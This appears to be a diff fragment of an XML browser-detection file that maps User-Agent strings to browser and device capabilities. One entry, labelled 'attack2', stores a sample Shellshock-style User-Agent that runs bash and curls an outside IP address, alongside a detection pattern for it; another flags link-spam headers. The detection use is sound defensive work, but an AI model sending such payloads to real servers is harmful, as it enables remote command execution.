+  <Capability Name="version" Value="${version}" />
+</Browser>
+<Browser Id="1153" ParentId="912" Prority="" Name="ChromeFail1">
+  <Samples Name="User-Agent" Value="Mozilla/5.0 (Linux; U; Android 1.5; en-us; SPH-M900 Build/CUPCAKE) AppleWebKit/528.5 (KHTML, like Gecko) Version/3.1.2 Mobile Safari/525.20.1" />
+  <Identification Type="Header" Name="User-Agent" Match="Version/(?'version'\d+\.\d+(\.\d+)?)" />
+  <Identification Type="Header" Name="User-Agent" NonMatch="Chrome" />
+  <Capability Name="browser" Value="Chrome" />
+  <Capability Name="version" Value="${version}" />
+</Browser>
+<Browser Id="1154" ParentId="993" Prority="" Name="MiuiBrowser">
+  <Samples Name="User-Agent" Value="Mozilla/5.0 (Linux; U; Android 8.0.0; zh-cn; Mi Note 2 Build/OPR1.170623.032) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/61.0.3163.128 Mobile Safari/537.36 XiaoMi/MiuiBrowser/10.1.1" />
+  <Identification Type="Header" Name="User-Agent" Match="MiuiBrowser/(?'version'\d+\.\d+(\.\d+)?)(\.\d+)" />
+  <Capability Name="browser" Value="MiuiBrowser" />
+  <Capability Name="version" Value="${version}" />
+</Browser>
+<Browser Id="1155" ParentId="913" Prority="1" Name="AppleWebKitMobileiPad">
+  <Identification Type="Header" Name="User-Agent" Match="iPad" />
+  <Identification Type="Header" Name="User-Agent" Match="Mobile/(?'Model'\w*)" />
+  <Capability Name="mobileDeviceModel" Value="iPad ${Model}" />
+  <Capability Name="mobileDeviceManufacturer" Value="Apple" />
+  <Capability Name="browser" Value="Mobile Safari" />
+</Browser>
+<Gateway Id="1156" ParentId="851" Prority="" Name="Mozilla5CompatibleA1">
+  <Samples Name="User-Agent" Value="Mozilla/5.0 (compatible; Cloudflare-AMP/1.0; +https://amp.cloudflare.com/doc/fetcher.html) AppleWebKit/534.34" />
+  <Identification Type="Header" Name="User-Agent" Match="^Mozilla/5\.0\s\(compatible;\s(?'browser'[^/\d;\)]*)/(?'version'\d+\.\d+([^;]*)?);" />
+  <Capability Name="browser" Value="${browser}" />
+  <Capability Name="version" Value="${version}" />
+  <Child Id="1157" Name="Cloudflare-AMP" Type="Browser" />
+</Gateway>
+<Browser Id="1157" ParentId="1156" Prority="" Name="Cloudflare-AMP">
+  <Identification Type="Header" Name="User-Agent" Match="Cloudflare-AMP/(?'version'\d+\.\d+)" />
+  <Capability Name="crawler" Value="True" />
+</Browser>
+<Gateway Id="1158" ParentId="799" Prority="" Name="Platform">
+  <Samples Name="sec-ch-ua-platform" Value="&quot;Android&quot;" />
+  <Identification Type="Header" Name="sec-ch-ua-platform" Match="(?'platform'.*)" />
+  <Capability Name="platform" Value="${platform}" />
+</Gateway>
+<Gateway Id="1159" ParentId="813" Prority="" Name="Trident">
+  <Identification Type="Header" Name="User-Agent" Match="Trident/(?'layoutEngineVersion'\d+\.\d)" />
+  <Identification Type="Header" Name="User-Agent" NonMatch="OPR/\d+\.\d+(\.\d+)?" />
+  <Capability Name="layoutEngine" Value="Trident" />
+  <Capability Name="layoutEngineVersion" Value="${layoutEngineVersion}" />
+</Gateway>
+<Gateway Id="1160" ParentId="813" Prority="" Name="Blink">
+  <Samples Name="User-Agent" Value="Mozilla/5.0 (Linux; U; Linux x86_64; en-US) AppleWebKit/603.35 (KHTML, like Gecko) Chrome/52.0.2700.139 Safari/537" />
+  <Identification Type="Header" Name="User-Agent" Match="\(KHTML,\slike\sGecko\)\s(?'browser'Chrome)/(?'version'\d+\.\d+(\.\d+)?)" />
+  <Capability Name="layoutEngine" Value="Blink" />
+</Gateway>
+<Browser Id="1161" ParentId="1065" Prority="" Name="ChromeOS">
+  <Samples Name="User-Agent" Value="Mozilla/5.0 (X11; CrOS x86_64 6946.70.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.132 Safari/537.36" />
+  <Identification Type="Header" Name="User-Agent" Match=";\sCrOS\s(?'Arch'.*)\s(?'OSversion'\d+\.\d+(\.\d+)?)" />
+  <Capability Name="OS" Value="Chrome OS ${OSversion}" />
+  <Capability Name="Arch" Value="${Arch}" />
+</Browser>
+<Browser Id="1162" ParentId="851" Prority="" Name="EdgiOS">
+  <Samples Name="User-Agent" Value="Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_2 like Mac OS X) AppleWebKit/603.2.4 (KHTML, like Gecko) Mobile/14F89 Safari/603.2.4 EdgiOS/41.1.35.1" />
+  <Identification Type="Header" Name="User-Agent" Match="EdgiOS/(?'version'\d+\.\d+(\.\d+)?)" />
+  <Capability Name="browser" Value="Microsoft Edge" />
+  <Capability Name="version" Value="${version}" />
+  <Capability Name="isMobileDevice" Value="True" />
+</Browser>
+<Browser Id="1163" ParentId="813" Prority="" Name="KHTML">
+  <Samples Name="User-Agent" Value="Mozilla/5.0 (X11; Linux 3.8-6.dmz.1-liquorix-686) KHTML/4.8.4 (like Gecko) Konqueror/4.8" />
+  <Identification Type="Header" Name="User-Agent" Match="Konqueror/(?'version'\d+\.\d+(\.\d+)?)" />
+  <Capture Type="Header" Name="User-Agent" Match="KHTML/(?'layoutEngineversion'\d+\.\d+(\.\d+)?)" />
+  <Capability Name="browser" Value="Konqueror" />
+  <Capability Name="version" Value="${version}" />
+  <Capability Name="layoutEngine" Value="KHTML" />
+  <Capability Name="layoutEngineVersion" Value="${layoutEngineversion}" />
+</Browser>
+<Gateway Id="1164" ParentId="1065" Prority="" Name="Mandriva">
+  <Samples Name="User-Agent" Value="Konqueror/16.1 (Conectiva (Mandriva) 4.6; ar_IQ;)" />
+  <Identification Type="Header" Name="User-Agent" Match="Mandriva" />
+  <Capability Name="OS" Value="Mandriva Linux" />
+</Gateway>
+<Browser Id="1165" ParentId="799" Prority="" Name="Konqueror">
+  <Samples Name="User-Agent" Value="Konqueror/16.1 (Conectiva (Mandriva) 4.6; ar_IQ;)" />
+  <Identification Type="Header" Name="User-Agent" Match="^Konqueror/(?'version'\d+\.\d+(\.\d+)?)" />
+  <Capability Name="browser" Value="Konqueror" />
+  <Capability Name="version" Value="${version}" />
+  <Capability Name="layoutEngine" Value="KHTML" />
+</Browser>
+<Gateway Id="1166" ParentId="1065" Prority="" Name="RIMOS">
+  <Samples Name="User-Agent" Value="Mozilla/5.0 (PlayBook; U; RIM Tablet OS 2.1.0; en-US) AppleWebKit/536.2+ (KHTML, like Gecko) Version/7.2.1.0 Safari/536.2+" />
+  <Identification Type="Header" Name="User-Agent" Match="RIM Tablet OS (?'OSversion'\d+\.\d+(\.\d+)?)" />
+  <Capability Name="OS" Value="RIM Tablet OS ${OSversion}" />
+</Gateway>
+<Browser Id="1167" ParentId="851" Prority="" Name="PlayBook">
+  <Samples Name="User-Agent" Value="Mozilla/5.0 (PlayBook; U; RIM Tablet OS 2.1.0; en-US) AppleWebKit/536.2+ (KHTML, like Gecko) Version/7.2.1.0 Safari/536.2+" />
+  <Identification Type="Header" Name="User-Agent" Match="Mozilla/5.0\s\(PlayBook;" />
+  <Identification Type="Header" Name="User-Agent" Match="Version/(?'version'\d+\.\d+(\.\d+)?)(\.\d+)?" />
+  <Capability Name="browser" Value="Blackberry Playbook Tablet" />
+  <Capability Name="isMobileDevice" Value="True" />
+  <Capability Name="mobileDeviceManufacturer" Value="RIM" />
+  <Capability Name="mobileDeviceModel" Value="PlayBook" />
+</Browser>
+<Browser Id="1168" ParentId="883" Prority="" Name="attack2">
+  <Samples Name="User-Agent" Value="() { :;}; /bin/bash -c 'curl http://176.102.38.36/search/e.php?h=owenbrady.net/cgi-bin/'" />
+  <Identification Type="Header" Name="User-Agent" Match="/bin/bash|/dev/null|\(curl |'curl" />
+  <Capability Name="browser" Value="Script Injection Attack" />
+  <Capability Name="OS" Value="Unknown" />
+</Browser>
+<Browser Id="1169" ParentId="912" Prority="" Name="Opera WebKit1">
+  <Samples Name="User-Agent" Value="Mozilla/5.0 (Linux; Android 4.0.4; MW0711 Build/IMM76D) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.138 Safari/537.36 OPR/22.0.1485.79355" />
+  <Identification Type="Header" Name="User-Agent" Match="OPR/(?'version'\d+\.\d+(\.\d+)?)(\.\d+)" />
+  <Capture Type="Header" Name="User-Agent" Match="Chrome/(?'Chromeversion'\d+\.\d+(\.\d+)?)(\.\d+)" />
+  <Capability Name="browser" Value="Opera Mobile" />
+  <Capability Name="version" Value="${version}" />
+  <Capability Name="Chromeversion" Value="${Chromeversion}" />
+</Browser>
+<Browser Id="1170" ParentId="813" Prority="" Name="Opera Mozilla">
+  <Samples Name="User-Agent" Value="Mozilla/5.0 (X11; Linux x86_64) Trident/5.0 Chrome/51.0.2704.106 Safari/537.36 OPR/38.0.2220.41" />
+  <Identification Type="Header" Name="User-Agent" Match="OPR/(?'version'\d+\.\d+(\.\d+)?)" />
+  <Capture Type="Header" Name="User-Agent" Match="Chrome/(?'Chromeversion'\d+\.\d+(\.\d+)?)" />
+  <Capability Name="browser" Value="Opera" />
+  <Capability Name="version" Value="${version}" />
+  <Capability Name="Chromeversion" Value="${Chromeversion}" />
+</Browser>
+<Browser Id="1171" ParentId="847" Prority="" Name="Opera nonGecko">
+  <Samples Name="User-Agent" Value="Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Trident/5.0 Chrome/51.0.2704.106 Safari/537.36 OPR/38.0.2220.41" />
+  <Identification Type="Header" Name="User-Agent" Match="OPR/(?'version'\d+\.\d+(\.\d+)?)" />
+  <Capture Type="Header" Name="User-Agent" Match=" AppleWebKit/(?'appleWebTechnologyVersion'(\d+\.\d+\+)|(\d+\.\d+)|(\d+\+)|(\d+\s))| Safari/(?'appleWebTechnologyVersion'(\d+\.\d+\+)|(\d+\.\d+)|(\d+\+)|(\d+\s))" />
+  <Capture Type="Header" Name="User-Agent" Match=" Chrome/(?'Chromeversion'\d+\.\d+(\.\d+)?)" />
+  <Capability Name="browser" Value="Opera" />
+  <Capability Name="version" Value="${version}" />
+  <Capability Name="appleWebTechnologyVersion" Value="${appleWebTechnologyVersion}" />
+  <Capability Name="Chromeversion" Value="${Chromeversion}" />
+</Browser>
+<Browser Id="1172" ParentId="909" Prority="" Name="Opera Gecko">
+  <Samples Name="User-Agent" Value="Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Chrome/51.0.2704.106 Safari/537.36 OPR/38.0.2220.41" />
+  <Identification Type="Header" Name="User-Agent" Match="OPR/(?'version'\d+\.\d+(\.\d+)?)" />
+  <Capture Type="Header" Name="User-Agent" Match=" AppleWebKit/(?'appleWebTechnologyVersion'(\d+\.\d+\+)|(\d+\.\d+)|(\d+\+)|(\d+\s))" />
+  <Capture Type="Header" Name="User-Agent" Match="Chrome/(?'Chromeversion'\d+\.\d+(\.\d+)?)" />
+  <Capability Name="browser" Value="Opera" />
+  <Capability Name="version" Value="${version}" />
+  <Capability Name="appleWebTechnologyVersion" Value="${appleWebTechnologyVersion}" />
+  <Capability Name="Chromeversion" Value="${Chromeversion}" />
+</Browser>
+<Browser Id="1173" ParentId="799" Prority="" Name="Spam">
+  <Samples Name="User-Agent" Value="&lt;a href=&quot;http://www.xxxxx.com/&quot;&gt;www.xxxxx.com&lt;/a&gt;" />
+  <Identification Type="Header" Name="User-Agent" Match="&lt;a\shref=" />
+  <Capability Name="browser" Value="Spam Bot" />
+  <Capability Name="crawler" Value="True" />
+  <Capability Name="version" Value="0.0" />
+</Browser>
+<Browser Id="1174" ParentId="993" Prority="" Name="YaBrowser2">
+  <Samples Name="User-Agent" Value="Mozilla/5.0 (Linux; arm_64; Android 8.0.0; ZE520KL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 YaBrowser/21.2.0.223.00 SA/3 Mobile Safari/537.36" />
+  <Identification Type="Header" Name="User-Agent" Match="YaBrowser/(?'version'\d+\.\d+(\.\d+)?)(\.\d+)" />
+  <Capability Name="browser" Value="YaBrowser" />
+  <Capability Name="version" Value="${version}" />
+</Browser>
+<Browser Id="1175" ParentId="914" Prority="" Name="FxiOS">
+  <Samples Name="User-Agent" Value="Mozilla/5.0 (iPhone; CPU OS 13_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/28.0  Mobile/15E148 Safari/605.1.15" />
+  <Identification Type="capability" Name="browser" Match="FxiOS" />
+  <Capability Name="browser" Value="Firefox" />
+</Browser>
